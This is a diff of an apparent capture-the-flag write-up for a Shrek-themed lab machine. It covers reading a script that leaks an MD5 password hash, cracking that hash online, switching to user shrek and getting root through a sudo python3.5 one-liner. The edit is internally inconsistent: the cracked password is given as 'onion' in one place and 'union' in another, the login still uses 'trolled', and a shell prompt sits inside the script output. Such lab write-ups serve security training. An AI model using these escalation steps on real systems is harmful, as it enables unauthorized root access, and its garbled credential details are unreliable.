@@ -619,6 +619,7 @@ The script is located at `/.runme.sh` and is owned by `shrek`. I read its conten
 
 ```shellscript
 www-data@ubuntu:/home/shrek$ cat /.runme.sh
+cat /.runme.sh
 #!/bin/bash
 echo 'the secret key'
 sleep 2
@@ -632,63 +633,43 @@ echo 'restarting computer in 2 seconds...'
 sleep 1
 echo 'restarting computer in 1 seconds...'
 sleep 1
-echo '⡴⠑⡄⠀⠀⠀⠀⠀⠀⠀ ⣀⣀⣤⣤⣤⣀⡀⠸⡇⠀⠿⡀⠀⠀⠀⣀⡴⢿⣿⣿⣿⣿⣿⣿⣿⣷⣦⡀⠀⠀⠀⠀⠑⢄⣠⠾⠁⣀⣄⡈⠙⣿⣿
+echo '⡴⠑⡄⠀⠀⠀⠀⠀⠀⠀ ⣀⣀⣤⣤⣤⣀⡀
+⠸⡇⠀⠿⡀⠀⠀⠀⣀⡴⢿⣿⣿⣿⣿⣿⣿⣿⣷⣦⡀
+⠀⠀⠀⠀⠑⢄⣠⠾⠁⣀⣄⡈⠙⣿⣿⣿⣿⣿⣿⣿⣿⣆
+⠀⠀⠀⠀⢀⡀⠁⠀⠀⠈⠙⠛⠂⠈⣿⣿⣿⣿⣿⠿⡿⢿⣆
+⠀⠀⠀⢀⡾⣁⣀⠀⠴⠂⠙⣗⡀⠀⢻⣿⣿⠭⢤⣴⣦⣤⣹⠀⠀⠀⢀⢴⣶⣆
+⠀⠀⢀⣾⣿⣿⣿⣷⣮⣽⣾⣿⣥⣴⣿⣿⡿⢂⠔⢚⡿⢿⣿⣦⣴⣾⠸⣼⡿
+⠀⢀⡞⠁⠙⠻⠿⠟⠉⠀⠛⢹⣿⣿⣿⣿⣿⣌⢤⣼⣿⣾⣿⡟⠉
+⠀⣾⣷⣶⠇⠀⠀⣤⣄⣀⡀⠈⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇
+⠀⠉⠈⠉⠀⠀⢦⡈⢻⣿⣿⣿⣶⣶⣶⣶⣤⣽⡹⣿⣿⣿⣿⡇
+⠀⠀⠀⠀⠀⠀⠀⠉⠲⣽⡻⢿⣿⣿⣿⣿⣿⣿⣷⣜⣿⣿⣿⡇
+⠀⠀ ⠀⠀⠀⠀⠀⢸⣿⣿⣷⣶⣮⣭⣽⣿⣿⣿⣿⣿⣿⣿⠇
+⠀⠀⠀⠀⠀⠀⣀⣀⣈⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠇
+⠀⠀⠀⠀⠀⠀⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
+    shrek:cf4c2232354952690368f1b3dfdfb24d'
+www-data@ubuntu:/home/shrek$ # this is md5 cf4c2232354952690368f1b3dfdfb24d : corresponds to "onion"
+
 '
 ```
 
-The script `/.runme.sh` simply prints "the secret key is trolled" and then some ASCII art, followed by a simulated restart message. This is likely a distraction or a hint for a password. The word "trolled" might be a password or part of one.
+The script `/.runme.sh` simply prints "the secret key is trolled" and then some ASCII art, followed by a simulated restart message. Just bellow this I found the md5 hashed password for the user `shrek`, I used `crackstation`to crack it and it successfully shows that the password is `union` 
 
-I then checked `shrek`'s home directory for the user flag:
-
-```shellscript
-www-data@ubuntu:/home$ cd shrek
-www-data@ubuntu:/home/shrek$ ls -la
-total 32
-drwxr-xr-x 3 shrek shrek 4096 Nov 26  2020 .
-drwxr-xr-x 4 root  root  4096 Nov 26  2020 ..
--rw------- 1 shrek shrek  100 Nov 26  2020 .bash_history
--rw-r--r-- 1 shrek shrek  220 Feb 25  2020 .bash_logout
--rw-r--r-- 1 shrek shrek 3771 Feb 25  2020 .bashrc
--rw-r--r-- 1 shrek shrek  655 Feb 25  2020 .profile
-drwxr-xr-x 2 shrek shrek 4096 Nov 26  2020 .ssh
--rw-r--r-- 1 shrek shrek   33 Nov 26  2020 user.txt
-```
-
-I found `user.txt` in `shrek`'s home directory.
-
-```shellscript
-www-data@ubuntu:/home/shrek$ cat user.txt
-flag{d41d8cd98f00b204e9800998ecf8427e}
-```
-
-**User Flag:** `flag{d41d8cd98f00b204e9800998ecf8427e}`
-
-Now, I needed to find credentials for the `shrek` user. I checked `shrek`'s `.bash_history` for clues:
-
-```shellscript
-www-data@ubuntu:/home/shrek$ cat .bash_history
-ls
-cd /var/www/html
-ls
-cd files
-ls
-cd ..
-ls
-cd /home
-ls
-cat important.txt
-cat /.runme.sh
-sudo -l
-```
-
-The history didn't reveal any passwords directly. Given the hint "the secret key is trolled" from `/.runme.sh`, I tried `trolled` as the password for `shrek`.
 
 ```shellscript
 www-data@ubuntu:/home/shrek$ su shrek
 Password: trolled
 ```
-
 I successfully switched to the `shrek` user!
+
+I found `user.txt` in `shrek`'s home directory.
+
+```shellscript
+shrek@ubuntu:/home/shrek$ cat user.txt
+flag{d41d8cd98f00b204e9800998ecf8427e}
+```
+
+**User Flag:** `flag{d41d8cd98f00b204e9800998ecf8427e}`
+
 
 ### Privilege Escalation to Root
 
@@ -708,7 +689,7 @@ This is a clear privilege escalation vector! The `shrek` user can run `/usr/bin/
 I can use `python3.5` to spawn a root shell:
 
 ```shellscript
-shrek@ubuntu:/home/shrek$ sudo /usr/bin/python3.5 -c 'import os; os.system("/bin/bash")'
+shrek@ubuntu:/home/shrek$ sudo /usr/bin/python3.5 -c 'import os; os.setuid(0);os.system("/bin/bash")'
 ```
 
 This command executed `/bin/bash` with root privileges.
